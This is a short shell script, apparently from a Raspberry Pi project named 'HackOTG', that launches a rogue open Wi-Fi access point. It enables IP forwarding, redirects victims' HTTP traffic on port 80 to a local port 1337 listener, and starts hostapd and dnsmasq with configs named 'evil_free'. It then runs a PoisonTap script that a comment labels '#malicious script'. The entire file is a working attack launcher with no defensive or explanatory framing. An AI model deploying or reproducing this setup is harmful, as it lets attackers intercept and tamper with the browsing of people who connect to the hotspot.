sudo ifconfig wlan0 up 1.0.0.1 netmask 255.255.255.0
#extra
sudo /sbin/sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337
#extra end

if [ $( mount | grep urandom | wc -l ) -eq 0 ]; then
	sudo mount --bind /dev/urandom /dev/random
fi
sh /home/pi/HackOTG/hotspot_stop.sh
sudo hostapd /home/pi/HackOTG/hostapd_evil_free.conf&
sudo dnsmasq -C /home/pi/HackOTG/dnsmasq_evil_free.conf&
sleep 2
sudo ifconfig wlan0 up 1.0.0.1 netmask 255.255.255.0

#malicious script
sh poisontap_simple.sh
